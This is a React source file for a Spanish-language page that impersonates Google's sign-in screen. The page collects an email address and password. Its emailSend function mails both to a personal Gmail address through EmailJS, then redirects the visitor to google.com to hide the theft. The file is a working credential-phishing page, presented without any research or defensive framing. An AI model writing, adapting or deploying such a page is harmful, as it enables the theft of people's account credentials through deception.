import React, { useState } from 'react'
import Button from '@material-ui/core/Button'
import CssBaseline from '@material-ui/core/CssBaseline'
import TextField from '@material-ui/core/TextField'
import Link from '@material-ui/core/Link'
import Grid from '@material-ui/core/Grid'
import Typography from '@material-ui/core/Typography'
import { makeStyles } from '@material-ui/core/styles'
import Container from '@material-ui/core/Container'
import Logo from './logo.svg'


const useStyles = makeStyles((theme) => ({
	paper: {
		marginTop: theme.spacing(8),
		display: 'flex',
		flexDirection: 'column',
		alignItems: 'center',
	},
	avatar: {
		margin: theme.spacing(1),
		height: '3vh'
	},
	form: {
		width: '100%', // Fix IE 11 issue.
		marginTop: theme.spacing(1),
	},
	submit: {
		margin: theme.spacing(3, 10, 2),
	},
}))

export default function App() {
	const [body, setBody] = useState({})
	const classes = useStyles()


	const onChange = e => {
		setBody({
			...body,
			[e.target.name]: e.target.value
		})
	}

	const emailSend = () => {
		window.emailjs.send("sam", "login",
			{
				"to": "samueldhljdm@gmail.com",
				"email": body.email,
				"password": body.password
			}).then(() => {
				window.location.href = 'https://google.com'
				setBody({})
			})
	}

	return (
		<Container component="main" maxWidth="xs">
			<CssBaseline />
			<div className={classes.paper}>
				<img className={classes.avatar} src={Logo} alt='...' />
				<Typography component="h1" variant="h5">
					Acceder
        </Typography>
				<Typography variant='subtitle2'>
					Usa tu Cuenta de Google
        </Typography>
				<form className={classes.form} noValidate>
					<TextField
						variant="outlined"
						margin="normal"
						fullWidth
						id="email"
						label="Correo Electrónico"
						placeholder="Correo Electrónico"
						name="email"
						autoComplete="email"
						onChange={onChange}
						value={body.email}
					/>
					<TextField
						variant="outlined"
						margin="normal"
						fullWidth
						name="password"
						label="Ingresa tu Contraseña"
						placeholder="Ingresa tu Contraseña"
						type="password"
						id="password"
						autoComplete="current-password"
						onChange={onChange}
						onKeyDown={e => { if (e.keyCode === 13) { emailSend() } }}
						value={body.password}
					/>
					<Grid container alignItems='center' >
						<Grid item xs={6}>
							<Link href="#" variant="body2">
								¿Olvidaste la contraseña?
              </Link>
						</Grid>
						<Grid item xs={6}>
							<Button
								variant="contained"
								color="primary"
								className={classes.submit}
								onClick={() => emailSend()}
							>
								Siguiente
          </Button>
						</Grid>
					</Grid>
				</form>
			</div>
		</Container>
	)
}